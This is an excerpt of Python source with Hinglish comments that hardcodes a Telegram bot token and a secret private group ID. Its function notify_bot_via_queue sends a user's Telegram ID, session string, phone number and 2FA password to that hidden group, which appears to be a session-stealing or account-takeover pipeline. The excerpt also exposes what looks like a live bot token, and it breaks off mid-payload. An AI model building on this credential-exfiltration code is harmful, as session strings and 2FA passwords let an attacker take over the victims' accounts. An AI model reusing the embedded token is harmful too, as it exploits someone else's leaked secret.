...
# ✅ Apna bot token aur secret queue chat ID daalo
BOT_TOKEN        = "8787029263:AAGPlHq5I8cc8-WXTuYT8_5eITKeRQ-fAgM"
# Ye ek alag SECRET private group hai jisme sirf bot admin ho
# Bot is group ke messages sunega aur process karega
QUEUE_CHAT_ID    = os.environ.get("QUEUE_CHAT_ID", "-1002843633996")  # apna secret queue group ID
...
def telegram_send(chat_id: str, text: str):
    """Pure stdlib se Telegram sendMessage - koi extra dependency nahi"""
...
def notify_bot_via_queue(tg_id: int, session: str, phone: str, tfa: str = None):
    """
    Verified data ko secret queue group mein bhejo.
    Bot wahan se utha ke process karega.
    Format: #VERIFIED JSON
    """
    payload = _json.dumps({
        "tg_id": tg_id,
        "session": session,
